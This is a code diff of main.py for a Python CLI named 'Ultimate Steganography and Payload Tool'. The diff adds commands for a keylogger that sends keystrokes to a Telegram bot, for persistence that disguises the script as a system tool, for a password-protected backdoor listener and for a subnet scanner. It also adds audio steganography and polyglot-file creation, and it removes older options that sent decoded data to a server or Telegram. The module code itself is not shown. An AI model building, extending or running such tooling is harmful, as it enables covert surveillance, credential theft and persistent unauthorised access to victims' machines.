@@ -2,10 +2,17 @@ import argparse
 import logging
 import sys
 import json
+import threading
+import os
 from modules.steganography import encode_image, decode_image, detect_stego
-from modules.payload import generate_payload, deobfuscate_payload, morph_payload
+from modules.payload import generate_payload
 from modules.network import send_to_server, send_to_telegram
-from modules.backdoor import backdoor
+from modules.backdoor import backdoor_listener
+from modules.audio_steganography import encode_audio, decode_audio
+from modules.polyglot import create_polyglot
+from modules.keylogger import start_keylogger
+from modules.system import add_persistence, mimic_system_tool, self_delete
+from modules.scanner import scan_subnet
 
 def load_config(config_path='config.json'):
     """Load configuration from a JSON file."""
@@ -25,22 +32,12 @@ def main():
     parser = argparse.ArgumentParser(
         description="Ultimate Steganography and Payload Tool",
         formatter_class=argparse.RawTextHelpFormatter,
-        epilog="""Examples:
-    # Encode a morphed message into an image
-    python main.py encode --input-image input.png --payload "Secret" --output-image output.png --morph
-
-    # Decode a message from an image and activate the backdoor
-    python main.py decode --input-image output.png --backdoor
-
-    # Generate a morphed payload
-    python main.py gen-payload --morph --output-file morphed_payload.bin
-"""
     )
     parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose logging')
     subparsers = parser.add_subparsers(dest="command", required=True)
 
-    # Encode command
-    encode_parser = subparsers.add_parser("encode", help="Embed payload into an image")
+    # Image Steganography
+    encode_parser = subparsers.add_parser("encode-image", help="Embed payload into an image")
     encode_parser.add_argument("--input-image", required=True, help="Input image path")
     encode_parser.add_argument("--payload", required=True, help="Text or file path for the payload")
     encode_parser.add_argument("--output-image", required=True, help="Output image path")
@@ -55,8 +52,7 @@ def main():
     encode_parser.add_argument("--opap", action="store_true", help="Use Optimal Pixel Adjustment Process (OPAP)")
     encode_parser.add_argument("--morph", action="store_true", help="Morph the payload before encoding")
 
-    # Decode command
-    decode_parser = subparsers.add_parser("decode", help="Extract payload from an image")
+    decode_parser = subparsers.add_parser("decode-image", help="Extract payload from an image")
     decode_parser.add_argument("--input-image", required=True, help="Input image path")
     decode_parser.add_argument("--key", help="Base64 encoded key for decryption")
     decode_parser.add_argument("--encrypt-method", default="fernet", choices=["fernet", "aes"], help="Decryption method to use")
@@ -65,11 +61,23 @@ def main():
     decode_parser.add_argument("--adaptive", action="store_true", help="Use adaptive extraction from edge regions")
     decode_parser.add_argument("--seed", help="Seed for random pixel ordering")
     decode_parser.add_argument("--bits", type=int, default=1, help="Number of bits per color channel used")
-    decode_parser.add_argument("--backdoor", action="store_true", help="Activate the backdoor after decoding")
-    decode_parser.add_argument("--send-server", action="store_true", help="Send extracted data to a remote server")
-    decode_parser.add_argument("--send-telegram", action="store_true", help="Send extracted data to a Telegram chat")
 
-    # Payload generation command
+    # Audio Steganography
+    encode_audio_parser = subparsers.add_parser("encode-audio", help="Embed payload into an audio file")
+    encode_audio_parser.add_argument("--input-audio", required=True, help="Input audio path (WAV)")
+    encode_audio_parser.add_argument("--payload", required=True, help="Payload string")
+    encode_audio_parser.add_argument("--output-audio", required=True, help="Output audio path")
+
+    decode_audio_parser = subparsers.add_parser("decode-audio", help="Extract payload from an audio file")
+    decode_audio_parser.add_argument("--input-audio", required=True, help="Input audio path (WAV)")
+
+    # Polyglot
+    polyglot_parser = subparsers.add_parser("create-polyglot", help="Create a polyglot file")
+    polyglot_parser.add_argument("--image", required=True, help="Path to the image file")
+    polyglot_parser.add_argument("--zip", required=True, help="Path to the ZIP file")
+    polyglot_parser.add_argument("--output", required=True, help="Output path for the polyglot file")
+
+    # Payload generation
     gen_payload_parser = subparsers.add_parser("gen-payload", help="Generate a payload")
     gen_payload_parser.add_argument("--type", default='random', choices=['random', 'custom'], help="Type of payload")
     gen_payload_parser.add_argument("--length", type=int, default=100, help="Length of the random payload")
@@ -84,29 +92,41 @@ def main():
     detect_parser.add_argument("--input-image", required=True, help="Input image path")
     detect_parser.add_argument("--bits", type=int, default=1, help="Number of bits per color channel to check")
 
-    # Backdoor command
-    backdoor_parser = subparsers.add_parser("backdoor", help="Activate the backdoor")
+    # Keylogger
+    keylogger_parser = subparsers.add_parser("keylogger", help="Start the keylogger")
+    keylogger_parser.add_argument("--duration", type=int, default=300, help="Duration to run the keylogger in seconds")
 
+    # Persistence
+    persist_parser = subparsers.add_parser("persist", help="Add persistence")
+
+    # Scanner
+    scan_parser = subparsers.add_parser("scan", help="Scan a subnet")
+    scan_parser.add_argument("--subnet", required=True, help="Subnet to scan (e.g., 192.168.1.)")
+    scan_parser.add_argument("--port", type=int, required=True, help="Port to scan for")
+
+    # Backdoor
+    backdoor_parser = subparsers.add_parser("backdoor", help="Start the backdoor listener")
+    backdoor_parser.add_argument("--port", type=int, default=5555, help="Port for the backdoor to listen on")
+    backdoor_parser.add_argument("--password", required=True, help="Password for the backdoor")
 
     args = parser.parse_args()
 
-    # Setup logging
     level = logging.DEBUG if args.verbose else logging.INFO
     logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')
+
+    tg_config = config.get("telegram", {})
+    bot_token = tg_config.get("bot_token")
+    chat_id = tg_config.get("chat_id")
+
+    script_path = os.path.abspath(sys.argv[0])
 
     seed = int(args.seed) if hasattr(args, 'seed') and args.seed else None
 
     try:
-        if args.command == "encode":
-            payload_to_embed = args.payload
-            if args.morph:
-                morphed_payload, morph_key = morph_payload(args.payload.encode())
-                payload_to_embed = morphed_payload
-                logging.info(f"Payload morphed with key: {morph_key}")
-
+        if args.command == "encode-image":
             encode_image(
                 input_path=args.input_image,
-                payload=payload_to_embed,
+                payload=args.payload,
                 output_path=args.output_image,
                 bits_per_channel=args.bits,
                 encrypt=args.encrypt,
@@ -119,10 +139,8 @@ def main():
                 verbose=args.verbose,
                 opap=args.opap
             )
-            print("Encoding complete.")
-
-        elif args.command == "decode":
-            extracted_data = decode_image(
+        elif args.command == "decode-image":
+            data = decode_image(
                 input_path=args.input_image,
                 key=args.key,
                 encrypt_method=args.encrypt_method,
@@ -133,25 +151,18 @@ def main():
                 seed=seed,
                 verbose=args.verbose
             )
-            if extracted_data is not None:
-                print("Extracted Payload:", extracted_data)
-                if args.send_server:
-                    server_url = config.get("server", {}).get("url")
-                    if server_url:
-                        send_to_server(server_url, extracted_data)
-                    else:
-                        logging.error("Server URL not configured.")
-                if args.send_telegram:
-                    tg_config = config.get("telegram", {})
-                    token = tg_config.get("bot_token")
-                    chat_id = tg_config.get("chat_id")
-                    if token and chat_id:
-                        send_to_telegram(token, chat_id, extracted_data)
-                    else:
-                        logging.error("Telegram bot token or chat ID not configured.")
-                if args.backdoor:
-                    print("Activating backdoor...")
-                    backdoor()
+            if data:
+                print(f"Extracted data: {data}")
+
+        elif args.command == "encode-audio":
+            encode_audio(args.input_audio, args.payload, args.output_audio)
+        elif args.command == "decode-audio":
+            data = decode_audio(args.input_audio)
+            if data:
+                print(f"Extracted data: {data}")
+
+        elif args.command == "create-polyglot":
+            create_polyglot(args.image, args.zip, args.output)
 
         elif args.command == "gen-payload":
             payload = generate_payload(
@@ -173,9 +184,21 @@ def main():
             result = detect_stego(input_path=args.input_image, bits_per_channel=args.bits)
             print(result)
 
+        elif args.command == "keylogger":
+            if not bot_token or not chat_id:
+                logging.error("Telegram bot token and chat ID must be configured for the keylogger.")
+                sys.exit(1)
+            start_keylogger(args.duration, bot_token, chat_id)
+
+        elif args.command == "persist":
+            mimic_system_tool(script_path)
+            add_persistence(script_path)
+
+        elif args.command == "scan":
+            scan_subnet(args.subnet, args.port)
+
         elif args.command == "backdoor":
-            print("Activating backdoor...")
-            backdoor()
+            backdoor_listener(args.port, args.password)
 
     except Exception as e:
         logging.error(f"An error occurred: {e}", exc_info=args.verbose)
